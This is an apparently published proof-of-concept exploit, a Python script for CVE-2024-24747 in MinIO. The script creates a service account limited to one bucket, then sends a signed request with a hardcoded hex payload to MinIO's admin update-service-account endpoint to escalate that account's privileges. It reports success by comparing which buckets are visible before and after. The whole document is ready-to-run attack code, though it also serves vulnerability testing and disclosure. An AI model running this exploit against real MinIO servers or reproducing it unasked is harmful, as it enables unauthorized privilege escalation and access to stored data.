# Exploit Title: MinIO < 2024-01-31T20-20-33Z -  Privilege Escalation
# Date: 2024-04-11
# Exploit Author: Jenson Zhao
# Vendor Homepage: https://min.io/
# Software Link: https://github.com/minio/minio/
# Version: Up to (excluding) RELEASE.2024-01-31T20-20-33Z
# Tested on: Windows 10
# CVE : CVE-2024-24747
# Required before execution: pip install minio,requests

import argparse
import datetime
import traceback
import urllib
from xml.dom.minidom import parseString
import requests
import json
import base64
from minio.credentials import Credentials
from minio.signer import sign_v4_s3

class CVE_2024_24747:
    new_buckets = []
    old_buckets = []
    def __init__(self, host, port, console_port, accesskey, secretkey, verify=False):
        self.bucket_names = ['pocpublic', 'pocprivate']
        self.new_accesskey = 'miniocvepoc'
        self.new_secretkey = 'MINIOcvePOC'
        self.headers = {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
          'Content-Type': 'application/json',
          'Accept': '*/*'
        }
        self.accesskey = accesskey
        self.secretkey = secretkey
        self.verify = verify
        if verify:
            self.url = "https://" + host + ":" + port
            self.console_url = "https://" + host + ":" + console_port
        else:
            self.url = "http://" + host + ":" + port
            self.console_url = "http://" + host + ":" + console_port
        self.credits = Credentials(
            access_key=self.new_accesskey,
            secret_key=self.new_secretkey
        )
        self.login()
        try:
            self.create_buckets()
            self.create_accesskey()
            self.old_buckets = self.console_ls()
            self.console_exp()
            self.new_buckets = self.console_ls()

        except:
            traceback.print_stack()
        finally:
            self.delete_accesskey()
            self.delete_buckets()
            if len(self.new_buckets) > len(self.old_buckets):
                print("There is CVE-2024-24747 problem with the minio!")
                print("Before the exploit, the buckets are : " + str(self.old_buckets))
                print("After the exploit, the buckets are : " + str(self.new_buckets))
            else:
                print("There is no CVE-2024-24747 problem with the minio!")

    def login(self):
        url = self.url + "/api/v1/login"
        payload = json.dumps({
          "accessKey": self.accesskey,
          "secretKey": self.secretkey
        })
        self.session = requests.session()
        if self.verify:
            self.session.verify = False
        status_code = self.session.request("POST", url, headers=self.headers, data=payload).status_code
        # print(status_code)
        if status_code == 204:
            status_code = 0
        else:
            print('Login failed! Please check if the input accesskey and secretkey are correct!')
            exit(1)
    def create_buckets(self):
        url = self.url + "/api/v1/buckets"
        for name in self.bucket_names:
            payload = json.dumps({
                "name": name,
                "versioning": False,
                "locking": False
            })
            status_code = self.session.request("POST", url, headers=self.headers, data=payload).status_code
            # print(status_code)
            if status_code == 200:
                status_code = 0
            else:
                print("新建 (New)"+name+" bucket 失败 (fail)！")
    def delete_buckets(self):
        for name in self.bucket_names:
            url = self.url + "/api/v1/buckets/" + name
            status_code = self.session.request("DELETE", url, headers=self.headers).status_code
            # print(status_code)
            if status_code == 204:
                status_code = 0
            else:
                print("删除 (delete)"+name+" bucket 失败 (fail)！")
    def create_accesskey(self):
        url = self.url + "/api/v1/service-account-credentials"
        payload = json.dumps({
            "policy": "{              \n    \"Version\":\"2012-10-17\",              \n    \"Statement\":[              \n        {              \n            \"Effect\":\"Allow\",              \n            \"Action\":[              \n                \"s3:*\"              \n            ],              \n            \"Resource\":[              \n                \"arn:aws:s3:::pocpublic\",              \n                \"arn:aws:s3:::pocpublic/*\"              \n            ]              \n        }              \n    ]              \n}",
            "accessKey": self.new_accesskey,
            "secretKey": self.new_secretkey
        })
        status_code = self.session.request("POST", url, headers=self.headers, data=payload).status_code
        # print(status_code)
        if status_code == 201:
            # print("新建 (New)" + self.new_accesskey + " accessKey 成功 (success)！")
            # print(self.new_secretkey)
            status_code = 0
        else:
            print("新建 (New)" + self.new_accesskey + " accessKey 失败 (fail)！")
    def delete_accesskey(self):
        url = self.url + "/api/v1/service-accounts/" + base64.b64encode(self.new_accesskey.encode("utf-8")).decode('utf-8')
        status_code = self.session.request("DELETE", url, headers=self.headers).status_code
        # print(status_code)
        if status_code == 204:
            # print("删除" + self.new_accesskey + " accessKey成功！")
            status_code = 0
        else:
            print("删除 (delete)" + self.new_accesskey + " accessKey 失败 (fail)！")
    def headers_gen(self,url,sha256,method):
        datetimes = datetime.datetime.utcnow()
        datetime_str = datetimes.strftime('%Y%m%dT%H%M%SZ')
        urls = urllib.parse.urlparse(url)
        headers = {
            'X-Amz-Content-Sha256': sha256,
            'X-Amz-Date': datetime_str,
            'Host': urls.netloc,
        }
        headers = sign_v4_s3(
            method=method,
            url=urls,
            region='us-east-1',
            headers=headers,
            credentials=self.credits,
            content_sha256=sha256,
            date=datetimes,
        )
        return headers
    def console_ls(self):
        url = self.console_url + "/"
        sha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        headers = self.headers_gen(url,sha256,'GET')
        if self.verify:
            response = requests.get(url,headers=headers,verify=False)
        else:
            response = requests.get(url, headers=headers)
        DOMTree = parseString(response.text)
        collection = DOMTree.documentElement
        buckets = collection.getElementsByTagName("Bucket")
        bucket_names = []
        for bucket in buckets:
            bucket_names.append(bucket.getElementsByTagName("Name")[0].childNodes[0].data)
        # print('当前可查看的bucket有:\n' + str(bucket_names))
        return bucket_names

    def console_exp(self):
        url = self.console_url + "/minio/admin/v3/update-service-account?accessKey=" + self.new_accesskey
        sha256 = "0f87fd59dff29507f82e189d4f493206ea7f370d0ce97b9cc8c1b7a4e609ec95"
        headers = self.headers_gen(url, sha256, 'POST')
        hex_string = "e1fd1c29bed167d5cf4986d3f224db2994b4942291dbd443399f249b84c79d9f00b9e0c0c7eed623a8621dee64713a3c8c63e9966ab62fcd982336"
        content = bytes.fromhex(hex_string)
        if self.verify:
            response = requests.post(url,headers=headers,data=content,verify=False)
        else:
            response = requests.post(url,headers=headers,data=content)
        status_code = response.status_code
        if status_code == 204:
            # print("提升" + self.new_accesskey + " 权限成功！")
            status_code = 0
        else:
            print("提升 (promote)" + self.new_accesskey + " 权限失败 (Permission failed)！")

if __name__ == '__main__':
    logo = """ 
                           ____    ___   ____   _  _           ____   _  _    _____  _  _    _____ 
  ___ __   __  ___        |___ \  / _ \ |___ \ | || |         |___ \ | || |  |___  || || |  |___  |
 / __|\ \ / / / _ \ _____   __) || | | |  __) || || |_  _____   __) || || |_    / / | || |_    / / 
| (__  \ V / |  __/|_____| / __/ | |_| | / __/ |__   _||_____| / __/ |__   _|  / /  |__   _|  / /  
 \___|  \_/   \___|       |_____| \___/ |_____|   |_|         |_____|   |_|   /_/      |_|   /_/   
                            """
    print(logo)
    parser = argparse.ArgumentParser()
    parser.add_argument("-H", "--host", required=True, help="Host of the target. example: 127.0.0.1")
    parser.add_argument("-a", "--accesskey", required=True, help="Minio AccessKey of the target. example: minioadmin")
    parser.add_argument("-s", "--secretkey", required=True, help="Minio SecretKey of the target. example: minioadmin")
    parser.add_argument("-c", "--console_port", required=True, help="Minio console port of the target. example: 9000")
    parser.add_argument("-p", "--port", required=True, help="Minio port of the target. example: 9090")
    parser.add_argument("--https", action='store_true', help="Is MinIO accessed through HTTPS.")
    args = parser.parse_args()
    CVE_2024_24747(args.host,args.port,args.console_port,args.accesskey,args.secretkey,args.https)